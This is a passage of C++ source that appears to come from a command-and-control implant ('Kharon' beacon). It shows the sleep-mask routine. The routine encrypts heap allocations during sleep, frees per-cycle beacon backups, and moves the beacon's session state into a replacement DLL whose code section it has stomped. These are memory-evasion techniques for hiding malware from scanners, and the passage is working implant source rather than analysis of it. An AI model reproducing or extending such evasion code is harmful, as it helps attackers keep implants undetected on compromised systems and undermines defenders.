    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    if ( Self->Config.Mask.Heap ) {
        KhDbg( "deobfuscating heap allocations" );
        Self->Hp->Crypt();
    }

    //
    // After a successful Stomp2 cycle the beacon now lives in NextDll.
    // Update Session.Stomp so the next sleep cycle knows the current DLL,
    // and update Session.Base.Start to the new .text address.
    //
    if ( Self->Config.Mask.Logic == eChainLogic::Stomping2 && NextDllReady ) {
        KhDbg( "stomp2: migrating session state to replacement DLL at %p", NextDllInfo.TextStart );

        // free the old stomp DLL path if any
        if ( Self->Session.Stomp.DllPathc ) KhFree( Self->Session.Stomp.DllPathc );
        if ( Self->Session.Stomp.DllBackup ) KhFree( Self->Session.Stomp.DllBackup );

        Self->Session.Stomp.Base      = NextDllInfo.Base;
        Self->Session.Stomp.TextStart = NextDllInfo.TextStart;
        Self->Session.Stomp.TextRVA   = NextDllInfo.TextRVA;
        Self->Session.Stomp.TextSize  = NextDllInfo.TextSize;
        Self->Session.Stomp.DllHandle = NextDllInfo.DllHandle;
        Self->Session.Stomp.FullSize  = NextDllInfo.FullSize;
        Self->Session.Stomp.DllPathc  = NextDllInfo.DllPathc;
        Self->Session.Stomp.DllBackup = nullptr;

        Self->Session.Base.Start = U_PTR( NextDllInfo.TextStart );
    }

    // free the per-cycle beacon backup
    if ( StompReady && StompInfo.BeaconBackup ) {
        KhFree( StompInfo.BeaconBackup );
    }

    return CleanMask();
}

auto DECLFN Mask::Wait(
    _In_ ULONG Time
) -> BOOL {
    G_KHARON

    if ( Self->Config.Mask.Heap ) {
        KhDbg( "obfuscating heap allocations" );
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
        Self->Hp->Crypt();
    }

    KhDbg( "sleeping for %lu ms", Time );

    Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );

    if ( Self->Config.Mask.Heap ) {
        KhDbg( "deobfuscating heap allocations" );
        Self->Hp->Crypt();
    }

    return TRUE;
}